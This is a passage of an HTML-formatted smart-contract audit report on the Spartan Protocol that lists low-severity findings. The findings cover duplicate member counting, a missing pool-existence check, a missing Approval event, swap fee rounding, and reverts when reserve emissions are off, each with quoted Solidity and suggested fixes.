class=\"mtk12\">mapBondAsset_memberDetails</span><span class=\"mtk1\">[</span><span class=\"mtk12\">asset</span><span class=\"mtk1\">].</span><span class=\"mtk12\">members</span><span class=\"mtk1\">.</span><span class=\"mtk11\">push</span><span class=\"mtk1\">(</span><span class=\"mtk12\">member</span><span class=\"mtk1\">); </span><span class=\"mtk3\">// Add user to member array (scope: user -&gt; asset)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter grvsc-line-number\" aria-hidden=\"true\" data-content=\"66\"></span><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter grvsc-line-number\" aria-hidden=\"true\" data-content=\"67\"></span><span class=\"grvsc-source\"><span class=\"mtk1\">    ...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter grvsc-line-number\" aria-hidden=\"true\" data-content=\"68\"></span><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter grvsc-line-number\" aria-hidden=\"true\" data-content=\"69\"></span><span class=\"grvsc-source\"><span class=\"mtk3\">// Get the total count of all existing &amp; past BondVault members</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter grvsc-line-number\" aria-hidden=\"true\" data-content=\"70\"></span><span class=\"grvsc-source\"><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">memberCount</span><span class=\"mtk1\">() </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">view</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">count</span><span class=\"mtk1\">){</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter grvsc-line-number\" aria-hidden=\"true\" data-content=\"71\"></span><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk12\">arrayMembers</span><span class=\"mtk1\">.</span><span class=\"mtk12\">length</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter grvsc-line-number\" aria-hidden=\"true\" data-content=\"72\"></span><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter grvsc-line-number\" aria-hidden=\"true\" data-content=\"73\"></span><span class=\"grvsc-source\"><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">allMembers</span><span class=\"mtk1\">() </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">view</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">address</span><span class=\"mtk1\">[] </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_allMembers</span><span class=\"mtk1\">){</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter grvsc-line-number\" aria-hidden=\"true\" data-content=\"74\"></span><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk12\">arrayMembers</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter grvsc-line-number\" aria-hidden=\"true\" data-content=\"75\"></span><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<p>Use a construction like this:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"27\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk11\">mapping</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk4\">=&gt;</span><span class=\"mtk1\"> </span><span class=\"mtk12\">bool</span><span class=\"mtk1\">) </span><span class=\"mtk12\">isMember</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk15\">if</span><span class=\"mtk1\">(!</span><span class=\"mtk12\">isMember</span><span class=\"mtk1\">[</span><span class=\"mtk12\">member</span><span class=\"mtk1\">]){</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">isMember</span><span class=\"mtk1\">[</span><span class=\"mtk12\">member</span><span class=\"mtk1\">] = </span><span class=\"mtk4\">true</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">arrayMembers</span><span class=\"mtk1\">.</span><span class=\"mtk11\">push</span><span class=\"mtk1\">(</span><span class=\"mtk12\">member</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<p><strong><a href=\"https://github.com/code-423n4/2021-07-spartan-findings/issues/26#issuecomment-885523844\">SamusElderg (Spartan) confirmed and disagreed with severity</a>:</strong></p>\n<blockquote>\n<p>This appears to be true 👍\nWill need to have some discussion around whether it is worth the extra gas for the extra check when adding the member.\nMy limited opinion is that it is worth the extra gas to add the extra conditional for this one and have counts lining up to the correct amount even if it isn’t used elsewhere. But @verifyfirst (Spartan) ill let you decide on that!</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2021-07-spartan-findings/issues/26#issuecomment-894850416\">ghoul-sol (judge) commented</a>:</strong></p>\n<blockquote>\n<p>Sponsor confirmed so I’m keeping this</p>\n</blockquote>\n<h2 id=\"l-25-check-if-pool-exists-in-getpool-\" style=\"position:relative;\"><a href=\"#l-25-check-if-pool-exists-in-getpool-\" aria-label=\"l 25 check if pool exists in getpool  permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2021-07-spartan-findings/issues/5\">[L-25] check if pool exists in <code>getPool</code> </a></h2>\n<p>The function <code>getPool</code> doesn’t check if the pool exits (e.g. it doesn’t check if the resulting pool !=0)\nOther functions use the results of <code>getPool</code> and do followup actions.</p>\n<p>For example <code>createSynth</code> checks <code>isCuratedPool(_pool)</code> == true; if somehow <code>isCuratedPool(0)</code> would set to be true, then further actions could be done.\nAs far as I can see no actual problem occurs, but this is a dangerous construction and future code changes could introduce vulnerabilities.\nAdditionally the reverts that will occur if the result of <code>getPool</code>==0 are perhaps difficult to troubleshoot.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"28\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter grvsc-line-number\" aria-hidden=\"true\" data-content=\"119\"></span><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter grvsc-line-number\" aria-hidden=\"true\" data-content=\"120\"></span><span class=\"grvsc-source\"><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">getPool</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">token</span><span class=\"mtk1\">) </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> </span><span class=\"mtk11\">view</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">pool</span><span class=\"mtk1\">){</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter grvsc-line-number\" aria-hidden=\"true\" data-content=\"121\"></span><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">if</span><span class=\"mtk1\">(</span><span class=\"mtk12\">token</span><span class=\"mtk1\"> == </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">)){</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter grvsc-line-number\" aria-hidden=\"true\" data-content=\"122\"></span><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">pool</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">mapToken_Pool</span><span class=\"mtk1\">[</span><span class=\"mtk12\">WBNB</span><span class=\"mtk1\">];   </span><span class=\"mtk3\">// Handle BNB</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter grvsc-line-number\" aria-hidden=\"true\" data-content=\"123\"></span><span class=\"grvsc-source\"><span class=\"mtk1\">    } </span><span class=\"mtk15\">else</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter grvsc-line-number\" aria-hidden=\"true\" data-content=\"124\"></span><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">pool</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">mapToken_Pool</span><span class=\"mtk1\">[</span><span class=\"mtk12\">token</span><span class=\"mtk1\">];  </span><span class=\"mtk3\">// Handle normal token</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter grvsc-line-number\" aria-hidden=\"true\" data-content=\"125\"></span><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter grvsc-line-number\" aria-hidden=\"true\" data-content=\"126\"></span><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk12\">pool</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter grvsc-line-number\" aria-hidden=\"true\" data-content=\"127\"></span><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter grvsc-line-number\" aria-hidden=\"true\" data-content=\"128\"></span><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter grvsc-line-number\" aria-hidden=\"true\" data-content=\"129\"></span><span class=\"grvsc-source\"><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">createPoolADD</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">inputBase</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">inputToken</span><span class=\"mtk1\">, </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">token</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">payable</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">pool</span><span class=\"mtk1\">){</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter grvsc-line-number\" aria-hidden=\"true\" data-content=\"130\"></span><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk11\">getPool</span><span class=\"mtk1\">(</span><span class=\"mtk12\">token</span><span class=\"mtk1\">) == </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">)); </span><span class=\"mtk3\">// Must be a valid token</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter grvsc-line-number\" aria-hidden=\"true\" data-content=\"131\"></span><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter grvsc-line-number\" aria-hidden=\"true\" data-content=\"132\"></span><span class=\"grvsc-source\"><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">createPool</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">token</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlyDAO</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">pool</span><span class=\"mtk1\">){</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter grvsc-line-number\" aria-hidden=\"true\" data-content=\"133\"></span><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk11\">getPool</span><span class=\"mtk1\">(</span><span class=\"mtk12\">token</span><span class=\"mtk1\">) == </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">)); </span><span class=\"mtk3\">// Must be a valid token</span></span></span></code></pre>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"29\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter grvsc-line-number\" aria-hidden=\"true\" data-content=\"37\"></span><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter grvsc-line-number\" aria-hidden=\"true\" data-content=\"38\"></span><span class=\"grvsc-source\"><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">createSynth</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">token</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">synth</span><span class=\"mtk1\">){</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter grvsc-line-number\" aria-hidden=\"true\" data-content=\"39\"></span><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk11\">getSynth</span><span class=\"mtk1\">(</span><span class=\"mtk12\">token</span><span class=\"mtk1\">) == </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">), </span><span class=\"mtk8\">&quot;exists&quot;</span><span class=\"mtk1\">); </span><span class=\"mtk3\">// Synth must not already exist</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter grvsc-line-number\" aria-hidden=\"true\" data-content=\"40\"></span><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_pool</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">iPOOLFACTORY</span><span class=\"mtk1\">(</span><span class=\"mtk11\">_DAO</span><span class=\"mtk1\">().</span><span class=\"mtk11\">POOLFACTORY</span><span class=\"mtk1\">()).</span><span class=\"mtk11\">getPool</span><span class=\"mtk1\">(</span><span class=\"mtk12\">token</span><span class=\"mtk1\">); </span><span class=\"mtk3\">// Get pool address</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter grvsc-line-number\" aria-hidden=\"true\" data-content=\"41\"></span><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk11\">iPOOLFACTORY</span><span class=\"mtk1\">(</span><span class=\"mtk11\">_DAO</span><span class=\"mtk1\">().</span><span class=\"mtk11\">POOLFACTORY</span><span class=\"mtk1\">()).</span><span class=\"mtk11\">isCuratedPool</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_pool</span><span class=\"mtk1\">) == </span><span class=\"mtk4\">true</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;!curated&quot;</span><span class=\"mtk1\">); </span><span class=\"mtk3\">// Pool must be Curated</span></span></span></code></pre>\n<p>Recommend In function <code>getPool</code> add something like:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"30\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk11\">require</span><span class=\"mtk1\">  (</span><span class=\"mtk12\">pool</span><span class=\"mtk1\"> !=</span><span class=\"mtk7\">0</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;Pool doesn&#39;t exist&quot;</span><span class=\"mtk1\">);</span></span></span></code></pre>\n<p>Note: the functions <code>createPoolADD</code> and <code>createPool</code> also have to be changed, to use a different way to verify the pool doesn’t exist.</p>\n<h2 id=\"-l-26approval-event-not-emitted-if-the-allowance-is-the-maximum\" style=\"position:relative;\"><a href=\"#-l-26approval-event-not-emitted-if-the-allowance-is-the-maximum\" aria-label=\" l 26approval event not emitted if the allowance is the maximum permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2021-07-spartan-findings/issues/231\">[ L-26]\t<code>Approval</code> event not emitted if the allowance is the maximum</a></h2>\n<p>According to the BEP20 specification, the <code>Approval</code> event:</p>\n<p>MUST trigger on any successful call to <code>approve(address _spender, uint256 _value)</code>.</p>\n<p>However, the implementation of pool LP tokens and synths do not emit the <code>Approval</code> event when the allowance is the maximum number, i.e., type(uint256).max.</p>\n<p>Recommend emitting the approval event whenever the approve call succeeds, even if the allowance does not change.</p>\n<h2 id=\"l-27-utilssol-combine-swap-output--fee-calculation-to-avoid-rounding-errors--integer-overflow-updated\" style=\"position:relative;\"><a href=\"#l-27-utilssol-combine-swap-output--fee-calculation-to-avoid-rounding-errors--integer-overflow-updated\" aria-label=\"l 27 utilssol combine swap output  fee calculation to avoid rounding errors  integer overflow updated permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2021-07-spartan-findings/issues/34\">[L-27] Utils.sol: Combine Swap Output + Fee Calculation to avoid Rounding Errors + Integer Overflow [Updated]</a></h2>\n<p>For minting, burning of synths and swaps, the fee and output amounts are calculated separately via <code>calcSwapOutput</code> and <code>calcSwapFee</code>. To avoid rounding errors and duplicate calculations, it would be best to combine both of these functions and return both outputs at once.</p>\n<p>For example, if we take <code>x = 60000, X = 73500, Y = 50321</code>, the actual swap fee should be <code>10164.57</code> and output <code>12451.6</code>. However, <code>calcSwapOutput</code> and <code>calcSwapFee</code> returns <code>10164</code> and <code>12451</code>, leaving 1 wei unaccounted for. This can be avoided by combining the calculations as suggested below. The fee and actual output will be <code>10164</code> and <code>12452</code> instead.</p>\n<p>Functions that have to call <code>calcSwapOutput</code> within the contract (eg. <code>calcSwapValueInBaseWithPool</code>) should call this function as well, for calculation consistency.</p>\n<p>In addition, calculations for both <code>calcSwapOutput</code> and <code>calcSwapFee</code> will phantom overflow if the input values become too large. (Eg. <code>x = 2^128, Y=2^128</code>). This can be avoided by the suggested implementation below using the FullMath library.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"jsx\" data-index=\"31\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">calcSwapFeeAndOutput</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">x</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">X</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">Y</span><span class=\"mtk1\">) </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> </span><span class=\"mtk11\">pure</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">output</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">swapFee</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">xAddX</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">x</span><span class=\"mtk1\"> + </span><span class=\"mtk12\">X</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">rawOutput</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">FullMath</span><span class=\"mtk1\">.</span><span class=\"mtk11\">mulDiv</span><span class=\"mtk1\">(</span><span class=\"mtk12\">x</span><span class=\"mtk1\">, </span><span class=\"mtk12\">Y</span><span class=\"mtk1\">, </span><span class=\"mtk12\">xAddX</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">swapFee</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">FullMath</span><span class=\"mtk1\">.</span><span class=\"mtk11\">mulDiv</span><span class=\"mtk1\">(</span><span class=\"mtk12\">rawOutput</span><span class=\"mtk1\">, </span><span class=\"mtk12\">x</span><span class=\"mtk1\">, </span><span class=\"mtk12\">xAddX</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">output</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">rawOutput</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">swapFee</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">calcSwapValueInBaseWithPool</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">pool</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">) </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> </span><span class=\"mtk11\">view</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_output</span><span class=\"mtk1\">){</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_baseAmount</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">iPOOL</span><span class=\"mtk1\">(</span><span class=\"mtk12\">pool</span><span class=\"mtk1\">).</span><span class=\"mtk11\">baseAmount</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_tokenAmount</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">iPOOL</span><span class=\"mtk1\">(</span><span class=\"mtk12\">pool</span><span class=\"mtk1\">).</span><span class=\"mtk11\">tokenAmount</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    (</span><span class=\"mtk12\">_output</span><span class=\"mtk1\">, ) = </span><span class=\"mtk11\">calcSwapFeeAndOutput</span><span class=\"mtk1\">(</span><span class=\"mtk12\">amount</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_tokenAmount</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_baseAmount</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<p>The <code>FullMath</code> library is included (and made compatible with sol 0.8+) on the issue page for convenience.</p>\n<h2 id=\"l-28-daosol-reserve-emissions-must-be-turned-on-for-depositlps-and-bonds\" style=\"position:relative;\"><a href=\"#l-28-daosol-reserve-emissions-must-be-turned-on-for-depositlps-and-bonds\" aria-label=\"l 28 daosol reserve emissions must be turned on for depositlps and bonds permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2021-07-spartan-findings/issues/44\">[L-28] Dao.sol: Reserve emissions must be turned on for <code>depositLPs</code> and bonds</a></h2>\n<p><code>depositLPForMember()</code> and <code>bond()</code> invokes <code>harvest()</code> if a user has existing LP deposits or bonded assets into the DAO. This is to prevent users from depositing more assets before calling <code>harvest()</code> to earn more DAOVault incentives. However, <code>harvest()</code> reverts if reserve emissions are turned off.</p>\n<p>Hence, deposits / bonds performed by existing users will fail should reserve emissions be disabled.</p>\n<p>Cache claimable rewards into a separate mapping when <code>depositLPForMember()</code> and <code>bond()</code> are called. <code>harvest()</code> will then attempt to claim these cached + pending rewards. Perhaps Synthetix’s Staking Rewards contract or Sushiswap’s FairLaunch contract can provide some inspiration.</p>\n<h2 id=\"l-29-missing-zero-address-check-on-bondvault-constructor\" style=\"position:relative;\"><a href=\"#l-29-missing-zero-address-check-on-bondvault-constructor\" aria-label=\"l 29 missing zero address check on bondvault constructor permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 